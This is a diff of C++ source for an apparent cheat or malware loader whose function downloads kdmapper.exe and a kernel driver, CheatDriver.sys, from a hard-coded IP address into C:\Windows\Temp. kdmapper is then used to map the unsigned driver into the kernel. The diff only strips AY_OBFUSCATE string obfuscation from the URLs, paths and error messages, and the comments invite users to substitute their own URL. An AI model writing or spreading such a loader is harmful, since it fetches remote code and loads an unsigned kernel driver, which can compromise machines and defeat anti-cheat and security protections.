@@ -13,11 +13,11 @@ void executeKdmapper(const std::string& kdmapperPath, const std::string& driverP
 }
 
 int loader() {
-    auto kdmapper_url = AY_OBFUSCATE("http://91.191.173.36/kdmapper.exe"); // replace with your URL
+    auto kdmapper_url = "http://91.191.173.36/kdmapper.exe"; // replace with your URL
 
-    auto driver_url = AY_OBFUSCATE("http://91.191.173.36/CheatDriver.sys"); // replace with your URL
-    auto kdmapper_path = AY_OBFUSCATE("C:\\Windows\\Temp\\kdmapper.exe");
-    auto driver_path = AY_OBFUSCATE("C:\\Windows\\Temp\\CheatDriver.sys");
+    auto driver_url = "http://91.191.173.36/CheatDriver.sys"; // replace with your URL
+    auto kdmapper_path = "C:\\Windows\\Temp\\kdmapper.exe";
+    auto driver_path = "C:\\Windows\\Temp\\CheatDriver.sys";
 
     // Download kdmapper
     try
@@ -25,7 +25,7 @@ int loader() {
         URLDownloadToFile(NULL, kdmapper_url, kdmapper_path, 0, NULL);
     }
     catch (std::exception& e) {
-        std::cout << AY_OBFUSCATE("Failed to download kdmapper file: Check URL. ") << e.what() << std::endl;
+        std::cout << "Failed to download kdmapper file: Check URL. " << e.what() << std::endl;
         return 1;
     }
 
@@ -33,7 +33,7 @@ int loader() {
         URLDownloadToFile(NULL, driver_url, driver_path, 0, NULL);
     }
     catch (std::exception& e) {
-        std::cout << AY_OBFUSCATE("Failed to download driver file: Check URL. ") << e.what() << std::endl;
+        std::cout << "Failed to download driver file: Check URL. " << e.what() << std::endl;
         return 1;
     }
 
